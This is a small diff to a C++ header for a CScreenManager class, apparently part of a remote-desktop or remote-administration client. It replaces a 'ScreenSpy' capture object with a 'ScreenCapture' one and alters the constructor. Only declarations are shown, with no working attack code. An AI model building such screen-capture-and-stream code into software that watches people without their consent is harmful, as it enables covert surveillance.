@@ -11,14 +11,14 @@
 
 #include "Manager.h"
 #include "ScreenSpy.h"
+#include "ScreenCapture.h"
 
 class IOCPClient;
 
 class CScreenManager : public CManager  
 {
 public:
-	char*	szBuffer;
-	CScreenManager(IOCPClient* ClientObject, int n);
+	CScreenManager(IOCPClient* ClientObject, int n, void* user = nullptr);
 	virtual ~CScreenManager();
 	HANDLE  m_hWorkThread;
 
@@ -26,7 +26,7 @@ public:
 	VOID SendBitMapInfo();
 	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
 
-	CScreenSpy* m_ScreenSpyObject;
+	ScreenCapture* m_ScreenSpyObject;
 	VOID SendFirstScreen();
 	const char* GetNextScreen(ULONG &ulNextSendLength);
 	VOID SendNextScreen(const char* szBuffer, ULONG ulNextSendLength);
